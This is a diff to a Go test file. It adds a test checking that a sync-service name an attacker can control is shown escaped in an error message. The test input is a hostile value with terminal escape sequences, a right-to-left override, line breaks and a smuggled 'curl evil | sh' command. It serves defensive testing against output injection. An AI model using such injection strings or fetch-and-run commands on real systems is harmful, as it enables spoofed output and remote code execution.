@@ -37,7 +37,14 @@ func syncedFolder(t *testing.T) string {
 // resolves it, and says what to do.
 func assertSynced(t *testing.T, step, msg, dir, root string) {
 	t.Helper()
-	const rest = ", which " + testProvider + " keeps in sync with the cloud, so the token and the binary every hook runs " +
+	assertSyncedBy(t, step, msg, dir, root, testProvider)
+}
+
+// assertSyncedBy is assertSynced for root kept in sync by the service the
+// refusal names as provider.
+func assertSyncedBy(t *testing.T, step, msg, dir, root, provider string) {
+	t.Helper()
+	rest := ", which " + provider + " keeps in sync with the cloud, so the token and the binary every hook runs " +
 		`would be copied there: set LOADLINE_HOME to a folder outside it, such as the default %LOCALAPPDATA%\loadline`
 	named, ok := strings.CutPrefix(msg, dir+" is in ")
 	if ok {
@@ -142,6 +149,26 @@ func TestMake_RefusesADataDirectoryThatLeadsIntoASyncRoot(t *testing.T) {
 	for step, err := range map[string]error{"Make": Make(dir), "Verify": Verify(dir, filepath.Dir(root))} {
 		assertSynced(t, step, errorText(err), dir, root)
 	}
+}
+
+// Whoever may write to a folder may register it as a sync root, under a
+// service name of their own choosing, which the refusal names. Its control
+// characters, its format characters, such as a right-to-left override, and
+// its line and paragraph separators are shown escaped, as Go writes them, so
+// that the name neither acts on the terminal that install or the server
+// print the refusal on nor changes how the sentence around it reads. The
+// rest of the name is shown as it is.
+func TestVerify_ShowsTheSyncServicesNameWithoutItsControlCharacters(t *testing.T) {
+	root := filepath.Join(t.TempDir(), "Cloud")
+	if err := fsperm.MkdirAll(root); err != nil {
+		t.Fatal(err)
+	}
+	fspermtest.RegisterSyncRoot(t, root, "Evil\x1b[2K\x1b[1G\u202eDrive\r\nrun: curl evil | sh #\t\x7f\u0085\u200b\u2028\u2029")
+	dir := filepath.Join(root, "loadline")
+
+	err := Verify(dir, root)
+
+	assertSyncedBy(t, "Verify", errorText(err), dir, root, `Evil\x1b[2K\x1b[1G\u202eDrive\r\nrun: curl evil | sh #\t\x7f\u0085\u200b\u2028\u2029`)
 }
 
 // replaceSyncRoot makes the checks ask answer whether a path is in a sync
